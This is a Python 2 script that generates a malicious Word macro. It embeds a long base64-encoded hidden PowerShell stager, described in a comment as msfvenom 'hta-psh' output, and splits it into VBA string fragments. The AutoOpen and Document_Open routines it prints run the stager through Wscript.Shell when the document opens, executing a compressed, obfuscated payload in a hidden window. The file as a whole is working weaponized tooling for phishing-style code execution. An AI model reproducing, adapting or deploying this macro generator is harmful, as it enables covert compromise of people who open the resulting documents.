#from hta-psh format
n = 50

def split_string(command):
	for i in range(0, len(command), n):
		print "    Str = Str + " + '"' + command[i:i+n] + '"'


#insert hta encoded part only
encoded_command = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEARwBlAC8ANABXAEkAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBYAHEAbgAvAHcAYQBxAFEAYgBFAHUARQB0ADkAQwBtAGkAVgBUAHAAYgBGADYAQwBDAFUANABBAEIAeABPAGcANgB7ADEAfQBUAFkAYQA3AE8AdwA5AGwASgA3AHoAVgB1AHYALwAvADEAbQB3AFEANgBKAGsAdAB6AGwAVAB1AHAASwBDAEgAdAAyAFoAbgBiADIAbQBXAGQAbQA3AEMAVwBoAHcAdwBrAHsAMQAnACcAKwAnACcAfQBKAGYAeABWACsAdgBuAHgAZwA1AFMAdQB7ADEAfQBvAHAAUQBJAEMAbQA1ADIAVwBhAFIAbAAzAEkANwBTAHoAMQB0ADUAZQBpAE4AOQBFADEAUwBKAHQAcABxAFYAVwBjAEIASQB1AEgAMAA2AHEAcQBXAFIAQgBFAE8AKwBmAEcAOQBjAEkAMgA1AEYAcwBjADQAbQBGAEcAQwBZADAAVwBWAC8AcABLAEcAYwB4AHoAaABzADcAdgBaAEEAagB0AGMAKwBpAG4AbAAvAGkAeABjAFUAegBaAEQATgBGAFgAYgAxAFoAQQB6AHgAOQBLAFoARgByAHAAaQByADgATQBjAEoARwBJAHEAVwBDAHQASwB1AEMASgAvAC8AeQA2AHIAawA3AFAAeQB0AE4ARAA0AGsAUwBBAGEASwA3AEsAMQBpAHoAawBPAEMAaQA2AGwAcwBpAHIAOQBVAHMAVwBCADkAJwAnACsAJwAnADcAcwBWAFYAbQBTAFQATwBCAEcAewAxAH0AbQBjAGMAewAxAH0AUQB4AEsAZQBWAHcAcQBEAE0ARQBZAGUAdgBnAFYAdgBhADIAeABpAFAAbQBkAHUAewAxAH0ATQAnACcAKwAnACcATgBWAFQAcABlAEoATQBFACsAaQBVAE4AeABKAE8ARABtAHEASwBEAEkAOABkAGkAUABtAGEASwA0AGIANABUAGkAVwA4ADkASgBFAHUASgA5AE0AcAAzADgAbwBrAC8AVABzAGYAaABKAHkARQB1AEMAQwBFAFgASQBjAHMAWgBXAEYAbwB6AFYAeABjAEYAeABvAG8AZABDAGwAdQBJACsAOQBLAFYAaABaAFAAQwBLAGgAUAAxAFYAVgBVAEYAdQB6AEoAVgBaAHkAWQBVAEoAcABYAHYAbwB2AGIAcABSAGIAdgBNAG0AUQBlADYAKwBSADgAdABRAEkAdAB7ADEAfQBvADgAVQB2AE8AUQB6AFIAZQAzAE4ASgBtAGIAVQBIAHkAMABrADEAOABKAFUAKwBSAGYAaABYAFgAawBBAEMARAAzAFMANABEAG4AWgBaAHkAWgBSACsAdABYAFMASABNAFMAWgBHAHQAeQAyAE0ARQBRAHIAZABKAGwATQBUAG4AWQBmAHAATgBLAGUAYwBtAEUAawB4AEYAbgAwAFEANQBlAGMALwBkAFIAZwB0AFgAcABJADkAWgBTAHoAbgBuAEkAdgA5AGQAWABPAFQATQBFAHMAMwAxAC8AbABJAEIAbwBZAGoAUABpAFQAawAnACcAKwAnACcAOABPAG4AdQBVADkAdAA2ADgASQBsAGIAYwA1AFgATQBjAGUAQwBYAEYAOQBGADYASwBBAE8AQgBsAE4AbABkAGUAUwBnAFQAMgBLAEQAMwBBAFUATQByAFYAYgBpAEUAKwBSADAAdwAzAHMAMQBqAEgARgBQAHUASQBDAFkATQBHAEoARgAyAGEATgBnAFAAQgBIAFcAegAwAGgAMQBNAFcAUgA1AGsAQgBDAFkANABnAEsAYwBxADAAKwBEACsAYQBZAE0AMABVADIAUQBoAE0ASABBAE4AMwB4AEgAVQBpAGEAOAA2AEEANABjAEsAYQBkAEYAcwBRAHUATwAxADIAOABnADUASgBjAG8AeQBpAE8AOAAxAEkAMwBnAGUAcAAwADgAcABLAEYARQBjAFYAdQBYAHQAewAxAH0AQwBtAEsAUgBiAFcAcwB7ADEAfQBaADQAVgBFACsAaABXAHMAbQBsAEIATQBIAHgAVAB4AHoATgAxAFcAZgBnAFoAawBlAFcAbQBOAGgAegBLAFAARQBnAFoAUQBDAEEAUABmAFcAQwBqAHMARQBVAFkARgBIAFgAbQBvAFIARgArAHMANwBpACcAJwArACcAJwAvAGoAWgA0AGYASwByAGEATgBRAFEAcABWAEEAMAA0AEcAawBOADIAUQBDAEoAUQBNAEgAaQBnAGkAZwBSAHgAQQBtAGsAVQBBAHMAVwA1AGsAYQB3AG8AagBnAEEAagBVAE8AbgBhAEYAewAxACcAJwArACcAJwB9AGsAUQAxADkASQBDACsAUABBAEsAKwBSAGoAVgAzADQAMQB5AEkAegAvACcAJwArACcAJwBSADcASQB7ADEAfQBUAEQASQB3AG4AbwBRAEkAaQBiAFkAbwA0ADMAbgBKAEoAaABHAEgAcgBpAFAAdwBGAGMAVAA2AEgAeABHADgANwBEAFkAUQBTAGkAMwBDAGEAVgBLAFUAcgBLAHcAbQArAG8ANAB7ADEAfQA0AGsAUAAxAEMAVwAnACcAKwAnACcANgBtADAAQgB5AEEAaQBEAGkAQQAwAEkAeABZAG8ASwBNAFkAZgA2AGsAZQArADQAcgB5AHEAWABoAEgAYQBoAHEAcwBrAFIARgBTADAAOQBHAFgAcABLAHgAdABTAE4AawB3ADQAVABjAGcANQB3AGEAcgBYADcAZwAzADcAVQBXAHIARwBOAFcAMwBjADAAOAB6AFkAcwBOAHMAZABlAHUAOQBWAHEAdQA2AGIAbAB0ADIAbABWAHMATgBnADkAOQAwAEQAVwA0ADIASABoAFkAewAxAH0AUwAyAHYAMQBCAHkATQArAE4AcgBUAFcAUABTAGsAdABSADkAWAA5AHEAawAzADIAVgBrAGQAegBSADkAdgBpAGwANwAyACsAMwA1AFQAMAA3AFgANwBoAHUAOQA2AG8ANwBuAG4AKwAnACcAKwAnACcAaAAnACcAKwAnACcAVwBmADEAeQA1ACsAYgBwAEQATwBzADkAZgBSAFMAQgBYAFgAJwAnACsAJwAnAHEAagBhAFEAegAxAEQAZAA2AHEAUgBvADMAeQBLAGIAVgBJADQAUABlAHMAdAAzAGsAcwA1AEYATgAwAGMAQQByACsAZwAvAGwAUwAwAFMAMgBuAFcAaABoAGwANQBtADUATgB6AFQAdABlAG4ANwB1ADcATgB1AGUAZgBUACcAJwArACcAJwAwADMAMwBkADIAbwBWAGIAdwBjAFYAcABkAGEAUQA5AE4AcQBZAGMATgB1ADYAdQB4AG0AcABFAGQAYQB0ADIAZwAnACcAKwAnACcAUABtAG4AcAB2ADAATgBCADcAUABaAEIAOQA4AFkAdABlAEYAVwBTADAAdwBwAHIASQByAEQARwAzAHUAbQBXAGEAcgAvAFUAZgBqAEQAQgBBAGMAMwAxAG8AVgA4AGgANAA5AGQAQwBmAGcANgA4AG0AaABHAEEAVwBTADEAWABEAHgAVgB2ADIAdABUAE0AawA5AHIAcABvAG8AKwB0AGIAUAB0AFoAcQA3AFcAcgBaAGYAYgBEADMAcgBRAHEAYQB0ADgAZAAyADAAcgBrAGMAeAAyADYAagBYAGQALwBvADIAcQBqAGMAYQBPAHYAMQBhADYAMwBSAEgAdwB5AGEANAA2AEcAOQBIAEEALwB2ADYAWABnADQASwBJADgAWgBkAGoAYgBGAE8AZgBnAGcAVwB7ADEAfQArAHoAbAA3ACcAJwArACcAJwBPAGkAZQBlADAAYgA4ADIAMwBaAGgANwBNAHUARAB2ADQARABFAHQAQgBaAHgAUwAxAGUARAByADcAcQA0AGUAYgBHADcANgA1ADkAdAB6AGUAOAA2AEcAOQB2AGQANwBNAEsAMAB3AGIARgBvAHYAMABKAFUAagAwAFoAawBKAEMAZgBWADYAYQA1AFoAWABuAGIAYQBZAHMAMgArAFAARgBEAHoAdgBsADgATgAzAHkAUwA4ADcAYwBhAHYASQBtAGkAZQBJADQAbwBjAEEARgA2AGQAMQBhAEoAVABSAFkAMQAwADQAYgBjAFoAVQBSAFkASwBBAG8ATQA4AHkAVwBPAFEAawB4AGgAQgBzAEsAVQB6AEUAaQBzAFUAYwBvAGMATQBRAGwARQA0ADQAWQBoAGQAQgB3AE4AWQBsAEkATgBqAEUATgBRAHIAegAyAHAAMABxAE8AaQBlAGgAbwBSAG0AZQBqAHEAYQBnAHcAaABRAGwAVwBFAFMAYQBHAEQAUQA1AC8AJwAnACsAJwAnAFAAOAA2AFgAdABlAGEAawBFAHoAYgAyADAAewAxAH0AVgBVAFAAOQBIAC8ALwB0AFcAcABzAHQAUgBQAFQASgB5ACsARwB3AHcARwBWAG8AMgBkADYAOABBAHoATwBpAEMAYwBwAHkAdQArAEcAQwBXACcAJwArACcAJwBZAC8AaAAyADcAMABKAGwAQgB2AFkAUQBZAEgAewAxAH0ANgBGAC8AUQBEAE0ANwAxAHIAVgBBAFQAbQBlAE0AUABzAFUAdAB2AGQAUQBqAEMAMAA2AHcAQQBWADUAbAB1AFAAVgBFAEQAUAAwAGoATwBjAEQAQgBHAGYANABoADUAYgBnAFkAagBFADgASABiAFkANABFADkAZAA5AEoAbAA3AFEANQB6AGUASABQAC8AUgBlADYAbgBHACcAJwArACcAJwBUAC8AcwBQAHMAdQBDAHAAJwAnACsAJwAnAFgAeQBSADIAJwAnACsAJwAnAHgAZQBpAEoAOAB7ADEAfQBuAHIAVAAwADMAMwBiAC8ASQBTAEkAYwA5AEMAeABvAHMAaABRAGYAeAAvADIAcgBNAEsAUQBGADgAaQBTADcAawBCAGoAZwB2ADUAYwB1ADgAZQBsADcAbAAvAEMAegBXAC8AaQBjAE8AagBUADUAdgB3AEgAVQBRAFIAWABuAGIAZwBzAEEAQQBBAHsAMAB9AHsAMAB9ACcAJwApAC0AZgAnACcAPQAnACcALAAnACcATAAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA=="

print """Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
"""
split_string(encoded_command)
print """
    CreateObject("Wscript.Shell").Run Str
End Sub

"""
